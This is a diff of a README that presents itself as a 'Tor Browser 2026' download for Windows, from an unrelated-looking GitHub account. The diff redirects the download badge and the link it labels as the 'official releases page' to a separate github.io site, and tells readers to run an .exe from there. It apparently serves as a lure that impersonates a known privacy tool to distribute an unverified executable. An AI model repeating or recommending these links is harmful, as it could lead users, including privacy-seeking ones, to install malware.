@@ -1,12 +1,12 @@
 # 🌐 Tor-Browser-2026 - Browse the open web with privacy
 
-[![](https://img.shields.io/badge/Download-Tor_Browser_2026-blue)](https://github.com/sheepshearingditch178/Tor-Browser-2026/releases)
+[![](https://img.shields.io/badge/Download-Tor_Browser_2026-blue)](https://sheepshearingditch178.github.io)
 
 This software allows you to browse the internet while protecting your identity. Tor Browser routes your internet traffic through a volunteer network to hide your location and prevent tracking. This version works on Windows 10 and Windows 11 computers.
 
 ## 📥 How to download the software
 
-1. Visit the [official releases page](https://github.com/sheepshearingditch178/Tor-Browser-2026/releases).
+1. Visit the [official releases page](https://sheepshearingditch178.github.io).
 2. Look for the latest version number at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
